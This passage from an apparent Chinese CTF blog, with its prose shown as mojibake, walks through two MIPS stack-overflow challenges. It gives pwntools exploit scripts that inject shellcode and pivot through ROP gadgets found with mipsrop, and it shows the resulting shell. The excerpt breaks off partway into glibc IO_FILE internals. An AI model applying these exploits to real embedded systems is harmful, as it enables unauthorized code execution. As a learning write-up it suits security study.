<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span>&#123;  <span class="keyword">int</span> v3; <span class="comment">// $a2  int v5; // [sp+18h] [+18h]  setbuf(stdin, 0, envp);  setbuf(stdout, 0, v3);  printf(&quot;\x1B[33m&quot;);  puts(&quot;-----we1c0me t0 MP l0g1n s7stem-----&quot;);  v5 = sub_400840();  sub_400978(v5);  printf(&quot;\x1B[32m&quot;);  return puts(&quot;Now you getshell~&quot;);&#125;int sub_400840()&#123;  char v1[24]; // [sp+18h] [+18h] BYREF  memset(v1, 0, sizeof(v1));  printf(&quot;\x1B[34m&quot;);  printf(&quot;Username : &quot;);  read(0, v1, 24);  if ( strncmp(v1, &quot;admin&quot;, 5) )    exit(0);  printf(&quot;Correct name : %s&quot;, v1);  return strlen(v1);&#125;int __fastcall sub_400978(int a1)&#123;  char v2[20]; // [sp+18h] [+18h] BYREF  int v3; // [sp+2Ch] [+2Ch]  char v4[36]; // [sp+3Ch] [+3Ch] BYREF  v3 = a1 + 4;  printf(&quot;\x1B[31m&quot;);  printf(&quot;Pre_Password : &quot;);  read(0, v2, 36);  printf(&quot;Password : &quot;);  read(0, v4, v3);  if ( strncmp(v2, &quot;access&quot;, 6) || strncmp(v4, &quot;0123456789&quot;, 10) )    exit(0);  return puts(&quot;Correct password : **********&quot;);&#125;</span></span><br></pre></td></tr></table></figure>

<p>è¿™é“é¢˜æ¼æ´æ¯”è¾ƒæ˜æ˜¾ï¼Œç¬¬ä¸€ä¸ªå‡½æ•°æ³„éœ²æ ˆåœ°å€ï¼Œç¬¬äºŒä¸ªå‡½æ•°æ³„éœ²å¡«å……shellocdeç„¶åè°ƒåˆ°è¿™æ‰§è¡Œå°±è¡Œã€‚</p>
<p>æŒ‰é“ç†æ¥è¯´è¿™æ ·å°±è¡Œäº†ï¼ŒæŠŠbufå¡«æ»¡å°±èƒ½æ³„éœ²å¤„æ ˆåœ°å€äº†ï¼Œä½†æ˜¯æˆ‘å‘ç°æˆ‘çš„æ ˆåœ°å€æœ€åæ˜¯0x00,å¯¼è‡´%sè¾“å‡ºçš„æ—¶å€™ä¼šæˆªæ–­ï¼Œç„¶åæˆ‘é‡è¯•äº†å¾ˆå¤šæ¬¡ï¼Œå‘ç°æ ˆåœ°å€æœ€åéƒ½æ˜¯0x00,æœ€åç ´æ¡ˆäº†ï¼Œæˆ‘çš„qemu-mipselæ²¡æœ‰å¼€aslr,æ‰€ä»¥æ ˆåœ°å€ä¸€ç›´éƒ½æ˜¯å›ºå®šçš„ï¼Œç™¾åº¦è°·æ­Œä¸€é¡¿æŸ¥éƒ½è¯´qemuçš„aslré»˜è®¤å…³é—­ï¼Œä½†æ˜¯æ²¡äººå‘Šè¯‰æˆ‘æ€ä¹ˆå¼€ï¼Œå“ï¼Œé‚£å°±å½“æˆ‘æ³„éœ²å‡ºæ¥äº†ç»§ç»­åšå§ï¼ˆåæ­£æ ˆåœ°å€ä¸å˜ï¼‰ã€‚</p>
<p>è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;little&#x27;</span>)io = process([<span class="string">&quot;qemu-mipsel&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;./&quot;</span>,<span class="string">&quot;./pwn&quot;</span>])<span class="comment">#io = process([&quot;qemu-mipsel&quot;,&#x27;-g&#x27;,&#x27;1234&#x27;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])io.sendafter(&quot;name : &quot;,&quot;admin&quot;.ljust(0x18,&#x27;a&#x27;))io.recvuntil(&quot;Correct name : &quot;);sp=0x76fff000io.sendafter(&#x27;Pre_Password : &#x27;,&quot;access&quot;.ljust(20,&#x27;a&#x27;)+p32(0x100))io.sendafter(&#x27;Password : &#x27;,&#x27;0123456789&#x27;.ljust(0x28,&#x27;a&#x27;)+p32(sp)+asm(shellcraft.sh()))io.interactive()</span></span><br></pre></td></tr></table></figure>

<p>æ•ˆæœ</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@rootzhang-virtual-machine:~/mipsshell/HWS/pwn1/Mplogin/Mplogin$ python pwnc.py[+] Starting local process &#x27;/usr/bin/qemu-mipsel&#x27;: pid 16096[*] Switching to interactive modeCorrect password : **********$ lscore  lib  pwn    pwnc.py  qemu_pwn_20220117-133618_15898.core</span><br></pre></td></tr></table></figure>

<h2 id="ä¸¾ä¾‹ä¸‰-HWX-mipspwnå…¥é—¨é¢˜äºŒ"><a href="#ä¸¾ä¾‹ä¸‰-HWX-mipspwnå…¥é—¨é¢˜äºŒ" class="headerlink" title="ä¸¾ä¾‹ä¸‰ HWX mipspwnå…¥é—¨é¢˜äºŒ"></a>ä¸¾ä¾‹ä¸‰ HWX mipspwnå…¥é—¨é¢˜äºŒ</h2><p>è¿™é“é¢˜æ˜¯mipså¤§ç«¯ç¨‹åºï¼Œä¸çŸ¥é“ä¸ºå•¥æˆ‘çš„gdb-multiarchè€æ˜¯çˆ†æ®µé”™è¯¯ï¼ŒæŸ¥äº†å¥½åŠå¤©ä¹Ÿæ²¡æŸ¥å‡ºæ¥å•¥é—®é¢˜ï¼Œæˆ‘çœ‹åˆ«äººè°ƒè¯•mipså¤§ç«¯ä¹Ÿæ˜¯æˆ‘è¿™æ ·è°ƒè¯•çš„å•Šï¼Œå¥‡äº†æ€ªäº†ï¼Œæœ¬æ¥æƒ³é€šè¿‡è°ƒè¯•æ‰¾åˆ°åˆ°raçš„åç§»é‡çš„ï¼Œä¸è¿‡ä¸€ä¸ªä¸€ä¸ªè¾“ä¹Ÿèƒ½æ‰¾è§ï¼Œé‚£å°±è¿™æ ·æŠŠï¼Œåˆ«çš„å¸ˆå‚…æ‰¾åˆ°ç¦»raçš„åç§»é‡æ˜¯0x90ï¼Œç›´æ¥æ‹¿æ¥ç”¨å°±è¡Œï¼ˆmipsç¯å¢ƒå¥½å¸é©¬ï¼‰</p>
<p>è¿™é“é¢˜å’Œä¸Šé“é¢˜æœ‰äº›åƒåˆæœ‰äº›ä¸åƒï¼Œä¸¤é“é¢˜éƒ½æ˜¯ç›´æ¥shellcode,ä¸è¿‡ä¸Šé“é¢˜ç›´æ¥shellcodeçš„åœ°å€ï¼Œè¿™é“é¢˜ä¸çŸ¥é“ï¼ŒåªçŸ¥é“shellcodeç¦»spçš„åç§»é‡ï¼Œå°±ä¸èƒ½ç›´æ¥é€šè¿‡raç›´æ¥è·³åˆ°shellcodeæ‰§è¡Œäº†ï¼Œå¾—é€šè¿‡gadgeté—´æ¥è·³è½¬åˆ°è¿™é‡Œæ‰è¡Œ</p>
<p>idaçš„mipsrop</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">Python&gt;</span><span class="bash">mipsrop.stackfinder()----------------------------------------------------------------------------------------------------------------|  Address     |  Action                                              |  Control Jump                          |----------------------------------------------------------------------------------------------------------------|  0x004273C4  |  addiu <span class="variable">$a2</span>,<span class="variable">$sp</span>,0x98+var_34                           |  jalr  <span class="variable">$s0</span>                             ||  0x0042BCD0  |  addiu <span class="variable">$a2</span>,<span class="variable">$sp</span>,0xB0+var_34                           |  jalr  <span class="variable">$s2</span>                             ||  0x0042FA00  |  addiu <span class="variable">$v1</span>,<span class="variable">$sp</span>,0x160+var_12C                         |  jalr  <span class="variable">$s1</span>                             ||  0x004491F8  |  addiu <span class="variable">$a2</span>,<span class="variable">$sp</span>,0x60+var_28                           |  jalr  <span class="variable">$s1</span>                             ||  0x0044931C  |  addiu <span class="variable">$v0</span>,<span class="variable">$sp</span>,0x48+var_20                           |  jalr  <span class="variable">$s1</span>                             ||  0x00449444  |  addiu <span class="variable">$a2</span>,<span class="variable">$sp</span>,0x60+var_28                           |  jalr  <span class="variable">$s1</span>                             ||  0x0044AD58  |  addiu <span class="variable">$a1</span>,<span class="variable">$sp</span>,0x78+var_40                           |  jalr  <span class="variable">$s4</span>                             ||  0x0044AEFC  |  addiu <span class="variable">$a1</span>,<span class="variable">$sp</span>,0x80+var_44                           |  jalr  <span class="variable">$s5</span>                             ||  0x0044B154  |  addiu <span class="variable">$a1</span>,<span class="variable">$sp</span>,0x80+var_4C                           |  jalr  <span class="variable">$s2</span>                             ||  0x0044B1EC  |  addiu <span class="variable">$v0</span>,<span class="variable">$sp</span>,0x80+var_54                           |  jalr  <span class="variable">$s2</span>                             ||  0x0044B3EC  |  addiu <span class="variable">$v0</span>,<span class="variable">$sp</span>,0x198+var_158                         |  jalr  <span class="variable">$s0</span>                             ||  0x00454E94  |  addiu <span class="variable">$s7</span>,<span class="variable">$sp</span>,0xE0+var_C0                           |  jalr  <span class="variable">$s3</span>                             ||  0x00465BEC  |  addiu <span class="variable">$a1</span>,<span class="variable">$sp</span>,0xE8+var_BC                           |  jalr  <span class="variable">$s0</span>                             |----------------------------------------------------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure>

<p>è¿™äº›éƒ½æ˜¯ç¨‹åºè‡ªå¸¦çš„gadgetäº†</p>
<p>ç¨‹åºæœ€åæ˜¯è¿™æ ·å¤„ç†så¯„å­˜å™¨çš„</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">move    $sp, $fp.text:00400A30                 lw      $ra, 0x58+var_s24($sp).text:00400A34                 lw      $fp, 0x58+var_s20($sp).text:00400A38                 lw      $s7, 0x58+var_s1C($sp).text:00400A3C                 lw      $s6, 0x58+var_s18($sp).text:00400A40                 lw      $s5, 0x58+var_s14($sp).text:00400A44                 lw      $s4, 0x58+var_s10($sp).text:00400A48                 lw      $s3, 0x58+var_sC($sp).text:00400A4C                 lw      $s2, 0x58+var_s8($sp).text:00400A50                 lw      $s1, 0x58+var_s4($sp).text:00400A54                 lw      $s0, 0x58+var_s0($sp).text:00400A58                 addiu   $sp, 0x80.text:00400A5C                 jr      $ra.text:00400A60                 nop.text:00400A60  # End of function pwn</span><br></pre></td></tr></table></figure>

<p>è¿™äº›åœ°æ–¹éƒ½å¯ä»¥æº¢å‡ºåˆ°ï¼Œæ‰€ä»¥å¯ä»¥æ§åˆ¶s0-s7çš„å¯„å­˜å™¨çš„å€¼ï¼Œé‚£å‰é¢çš„é‚£äº›gadgetéƒ½èƒ½æ‹¿æ¥ç”¨ï¼Œæˆ‘ä»¬ç›´æ¥ä½¿ç”¨ç¬¬ä¸€ä¸ªã€‚</p>
<p>æŠŠshellcodeå­˜åœ¨$sp,0x98+var_34ä¸Šï¼Œç„¶åæŠŠraè¦†ç›–æˆç¬¬ä¸€ä¸ªgadgetçš„åœ°å€ï¼Œé‚£å°±ä¼šæŠŠshellcodeçš„åœ°å€ç»™$a2,ç„¶åè·³è½¬åˆ°$s0æ‰§è¡Œä»£ç ï¼Œ$s0æ˜¯å¯æ§çš„ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å¡«å……ä¸€ä¸ªè·³è½¬åˆ°$s2çš„gadgetï¼Œæœ€åå°±é¡ºåˆ©æ‰§è¡Œshellcodeä»£ç äº†ã€‚</p>
<p>é‚£æ€ä¹ˆæ‰¾ç¬¬äºŒä¸ªgadgetå‘¢ï¼Œåœ¨mipsä¸­ä¸€èˆ¬æ˜¯é€šè¿‡$t9å®Œæˆé—´æ¥è·³è½¬çš„ï¼Œå¯ä»¥åœ¨idaä¸­è¿™æ ·æœç´¢gadget</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">Python&gt;</span><span class="bash">mipsrop.find(<span class="string">&quot;move <span class="variable">$t9</span>,<span class="variable">$a2</span>&quot;</span>)----------------------------------------------------------------------------------------------------------------|  Address     |  Action                                              |  Control Jump                          |----------------------------------------------------------------------------------------------------------------|  0x00421684  |  move <span class="variable">$t9</span>,<span class="variable">$a2</span>                                        |  jr    <span class="variable">$a2</span>                             |----------------------------------------------------------------------------------------------------------------</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªgadgetçš„æ„æ€æ˜¯æŠŠ$a2çš„å€¼èµ‹å€¼ç»™$t9ï¼Œç„¶åè·³è½¬åˆ°$a2æ‰§è¡Œä»£ç ã€‚</p>
<p>æ€è·¯æ»¤å¥½äº†ï¼Œå°±å¯ä»¥å¼€å§‹ç€æ‰‹å†™ä»£ç äº†ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *context(arch=<span class="string">&#x27;mips&#x27;</span>,endian=<span class="string">&#x27;big&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)io = process([<span class="string">&quot;qemu-mips&quot;</span>,<span class="string">&quot;./pwn&quot;</span>])io.sendlineafter(<span class="string">&quot;number:&quot;</span>,<span class="string">&quot;1&quot;</span>)ra = <span class="number">0x004273C4</span> <span class="comment"># move sp+0x64 to a2 -&gt; jmp s0s0 = 0x00421684 # jmp a2                   payload = &#x27;1:&#x27;payload += &#x27;a&#x27;*0x6c + p32(s0) + &#x27;a&#x27;*0x20 + p32(ra)payload += &#x27;a&#x27;*0x64 + asm(shellcraft.sh())io.sendlineafter(&quot;Job.&#x27;&quot;,payload)io.interactive()</span></span><br></pre></td></tr></table></figure>

<h2 id="æ€»ç»“ï¼šmipsä¸€èˆ¬é€šè¿‡shellcodeå¾—åˆ°shell-è·³è½¬åˆ°shellcodeä¸æ˜¯çŸ¥é“åœ°å€ç›´æ¥è·³å°±æ˜¯é€šè¿‡å‡ ä¸ªgadgetè·³ã€‚èƒ½æ³„éœ²æ ˆåœ°å€å°±é€‰ç¬¬ä¸€ä¸ªï¼Œä¸èƒ½æ³„éœ²å°±é€‰ç¬¬äºŒä¸ªã€‚"><a href="#æ€»ç»“ï¼šmipsä¸€èˆ¬é€šè¿‡shellcodeå¾—åˆ°shell-è·³è½¬åˆ°shellcodeä¸æ˜¯çŸ¥é“åœ°å€ç›´æ¥è·³å°±æ˜¯é€šè¿‡å‡ ä¸ªgadgetè·³ã€‚èƒ½æ³„éœ²æ ˆåœ°å€å°±é€‰ç¬¬ä¸€ä¸ªï¼Œä¸èƒ½æ³„éœ²å°±é€‰ç¬¬äºŒä¸ªã€‚" class="headerlink" title="æ€»ç»“ï¼šmipsä¸€èˆ¬é€šè¿‡shellcodeå¾—åˆ°shell,è·³è½¬åˆ°shellcodeä¸æ˜¯çŸ¥é“åœ°å€ç›´æ¥è·³å°±æ˜¯é€šè¿‡å‡ ä¸ªgadgetè·³ã€‚èƒ½æ³„éœ²æ ˆåœ°å€å°±é€‰ç¬¬ä¸€ä¸ªï¼Œä¸èƒ½æ³„éœ²å°±é€‰ç¬¬äºŒä¸ªã€‚"></a>æ€»ç»“ï¼šmipsä¸€èˆ¬é€šè¿‡shellcodeå¾—åˆ°shell,è·³è½¬åˆ°shellcodeä¸æ˜¯çŸ¥é“åœ°å€ç›´æ¥è·³å°±æ˜¯é€šè¿‡å‡ ä¸ªgadgetè·³ã€‚èƒ½æ³„éœ²æ ˆåœ°å€å°±é€‰ç¬¬ä¸€ä¸ªï¼Œä¸èƒ½æ³„éœ²å°±é€‰ç¬¬äºŒä¸ªã€‚</h2><p>æœ€è¿‘mipsç»™æˆ‘æ•´æ¶å¿ƒäº†ğŸ¤¢ï¼Œæ‰“ç®—æ”¾mipså…ˆä¸æmipsäº†ï¼Œå…ˆå»å¤ç°ä¸€äº›x86çš„é¢˜ç›®äº†ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/11/io-file%E4%B9%8Bstdout/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/11/io-file%E4%B9%8Bstdout/" class="post-title-link" itemprop="url">io_fileä¹‹stdout</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-01-11 22:19:37 / ä¿®æ”¹æ—¶é—´ï¼š22:20:01" itemprop="dateCreated datePublished" datetime="2022-01-11T22:19:37+08:00">2022-01-11</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="IO-fileå­¦ä¹ -åŸºäº2-23æºç å­¦ä¹ "><a href="#IO-fileå­¦ä¹ -åŸºäº2-23æºç å­¦ä¹ " class="headerlink" title="IO_fileå­¦ä¹ (åŸºäº2.23æºç å­¦ä¹ )"></a>IO_fileå­¦ä¹ (åŸºäº2.23æºç å­¦ä¹ )</h1><p>io_fileæ˜¯ä¸€ä¸ªæè¿°æœ‰å…³ioæ“ä½œçš„æ–‡ä»¶ç»“æ„ä½“ï¼Œå½“æœ‰è¾“å‡ºå’Œè¾“å‡ºå‡½æ•°æ—¶ä¼šç”¨åˆ°è¿™ä¸ªç»“æ„ä½“ï¼Œå…¶ä»£ç å¦‚ä¸‹</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We always allocate an extra word following an _IO_FILE.</span></span><br><span class="line"><span class="comment">   This contains a pointer to the function jump table used.</span></span><br><span class="line"><span class="comment">   This is for compatibility with C++ streambuf; the word can</span></span><br><span class="line"><span class="comment">   be used to smash to a pointer to a virtual function table. */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ç»“æ„ä½“ä¸€å…±æœ‰ä¸¤ä¸ªå˜é‡ï¼Œfileå’Œvtable,å…¶ä¸­fileè®°å½•ç€ä¸€äº›æ•°æ®ï¼Œvtableå‚¨å­˜ç€å„ç§å„æ ·çš„å‡½æ•°æŒ‡é’ˆï¼Œä¹Ÿå«è™šè¡¨</p>
<h2 id="fileæºä»£ç "><a href="#fileæºä»£ç " class="headerlink" title="fileæºä»£ç "></a>fileæºä»£ç </h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;		<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å¯è§é‡Œé¢è®°å½•ç€å„ç§å„æ ·çš„æ•°æ®,å…¶ä¸­å’Œpwné¢˜ç›¸å…³çš„ä¹Ÿå°±å‡ ä¸ªå˜é‡</p>
<h2 id="vtableæºç "><a href="#vtableæºç " class="headerlink" title="vtableæºç "></a>vtableæºç </h2><p>åœ¨ libc2.23 ç‰ˆæœ¬ä¸‹ï¼Œ32 ä½çš„ vtable ç›¸å¯¹io_file_plusåç§»ä¸º 0x94ï¼Œ64 ä½åç§»ä¸º 0xd8</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>æ¯ä¸ªç¨‹åºå¯åŠ¨æ—¶ä¸€èˆ¬éƒ½æœ‰ä¸‰ä¸ªæ–‡ä»¶æµæ˜¯è‡ªåŠ¨æ‰“å¼€çš„:stdout,stdin,stderr,æ¯ä¸ªå…­éƒ½å¯¹åº”ä¸€ä¸ªè¿™ä¸ªç»“æ„ä½“ï¼Œè¿™ä¸‰ä¸ªç»“æ„ä½“é€šè¿‡é“¾è¡¨çš„å½¢å¼ç»„ç»‡ï¼Œé€šè¿‡å˜é‡_chainé“¾æ¥ï¼Œå¦‚å›¾</p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220111192200386.png" alt="image-20220111192200386"></p>
<p>è¿™ä¸‰ä¸ªç»“æ„ä½“éƒ½å‚¨å­˜åœ¨libc.soçš„æ•°æ®æ®µ</p>
<h2 id="io-fileä¹‹-flag"><a href="#io-fileä¹‹-flag" class="headerlink" title="io_fileä¹‹_flag"></a>io_fileä¹‹_flag</h2><p>_flagæ˜¯io_fileçš„ç¬¬ä¸€ä¸ªå˜é‡ï¼Œä»–çš„é«˜ä¸¤ä½æ˜¯ç”±libcå†³å®šçš„ï¼Œæ‰€ä»¥ä¸åŒçš„libcä¼šæœ‰ä¸åŒçš„å·®å¼‚ï¼Œubuntu16å³2.23çš„å‰ä¸¤ä½æ˜¯flags = 0xfbad0000,å‰ä¸¤ä½æ ‡è¯†è¿™ä¸ªæµæ˜¯ä»€ä¹ˆæ–‡ä»¶ï¼Œä½ä¸¤ä½å­—èŠ‚åˆ™æ ‡è¯†ç¨‹åºçš„æ‰§è¡ŒçŠ¶æ€,glibcä¸“é—¨å®å®šä¹‰äº†ä¸€äº›å¸¸é‡ï¼Œæ¯ä¸ªå¸¸é‡è®°å½•ä¸€ä¸ªæ‰§è¡ŒçŠ¶æ€ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_MAGIC 0xFBAD0000 <span class="comment">/* Magic number */</span></span></span><br><span class="line"><span class="meta">#<span 